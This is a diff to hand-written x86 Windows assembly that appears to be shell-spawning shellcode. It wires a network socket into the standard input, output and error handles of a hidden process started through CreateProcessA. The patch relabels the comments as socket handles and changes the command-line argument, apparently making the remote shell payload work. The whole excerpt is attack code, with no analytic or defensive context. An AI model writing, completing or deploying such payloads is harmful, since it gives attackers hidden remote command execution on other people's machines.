@@ -174,9 +174,9 @@ mov     byte [esi], 0x2c            ; cb = sizeof(STARTUPINFO)
 mov     word [esi + 0x2c], 0x101    ; dwFlags = STARTF_USESTDHANDLES (0x100) | STARTF_USESHOWWINDOW (0x1)
 mov     word [esi + 0x30], ax       ; wShowWindow = SW_HIDE (0)
 mov     edi, [ebp + hSocket]
-mov     [esi + 0x38], edi           ; hStdInput = eax
-mov     [esi + 0x3c], edi           ; hStdOutput = eax
-mov     [esi + 0x40], edi           ; hStdError = eax
+mov     [esi + 0x38], edi           ; hStdInput = socket
+mov     [esi + 0x3c], edi           ; hStdOutput = socket
+mov     [esi + 0x40], edi           ; hStdError = socket
 
 ; -----------------------------------
 ; PROCESS_INFORMATION
@@ -208,7 +208,7 @@ push    eax        ; bInheritHandles
 dec     eax
 push    eax        ; lpThreadAttributes
 push    eax        ; lpProcessAttributes
-push    eax        ; lpCommandLine
+push    ecx        ; lpCommandLine
 push    eax        ; lpApplicationName
 call    [ebp + CreateProcessA] ; https://learn.microsoft.com/es-es/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
 
